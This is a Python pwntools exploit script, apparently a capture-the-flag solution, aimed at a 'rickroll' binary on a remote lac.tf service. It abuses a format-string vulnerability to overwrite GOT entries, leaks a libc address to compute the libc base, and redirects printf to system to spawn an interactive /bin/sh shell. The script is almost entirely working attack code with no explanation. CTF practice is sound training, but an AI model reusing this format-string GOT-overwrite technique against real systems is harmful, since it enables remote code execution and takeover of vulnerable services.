#!/usr/bin/env python3

from pwn import *

elf = ELF("./rickroll_patched",checksec=False)
libc = ELF("./libc-2.31.so",checksec = False)
#ld = ELF("./ld-2.31.so")

context.binary = elf

def make_payload(addr_value, pos=19, leak_pos=None):

    sorted_value = sorted(addr_value.items(), key=lambda x:x[1])
    sorted_dict = dict(sorted_value)

    payload = b""
    bytes_print = 0
    for key in sorted_dict:
        needed_value = sorted_dict[key] - bytes_print
        if needed_value > 0:
            payload += f"%{needed_value}c%{pos}$hhn".encode()            
        else:
            payload +=  f"%{pos}$hhn".encode()
        pos += 1
        bytes_print = sorted_dict[key]
    if leak_pos:
        for leak in leak_pos:
            payload += f"%{leak}$p".encode()
    payload = payload.ljust(104,b"a")

    for key in sorted_dict:
        payload += p64(key)

    return payload

main = 0x0000000000401153

#p = elf.process()
p = remote('lac.tf', 31135)
puts = elf.got.puts



#payload = make_payload(fmt,23)

#print(payload)


payload = f"%11$hhn%{0x1153}c%10$hn%39$p".ljust(32,"|").encode() + p64(puts) + p64(elf.sym.main_called)

f = open("data.bin","wb")
f.write(payload)
f.close()
p.sendline(payload)

p.recvuntil(b"0x")

leak = int(p.recv(12),16)

libc.address = leak - 234 - libc.sym.__libc_start_main
one_gadget = libc.address + 0xc9620
system = libc.sym.system



val_a_0 = system & 0xff
val_a_1 = (system >> (1*8)) & 0xff
val_a_2 = (system >> (2*8)) & 0xff

a_addr = elf.got.printf
b_addr = elf.sym.main_called

fmt = {
      a_addr+0:val_a_0,
      a_addr+1:val_a_1,   
      a_addr+2:val_a_2,     

      b_addr+0:0,

}


log.info(f"Libc base 0x{libc.address:02x}")
log.info(f"system 0x{libc.sym.system:02x}")
log.info(f"printf 0x{libc.sym.printf:02x}")
log.info(f"setbuf 0x{libc.sym.setbuf:02x}")

p.sendline(make_payload(fmt))
p.sendline("/bin/sh\x00;")
#p.recv()
p.interactive()
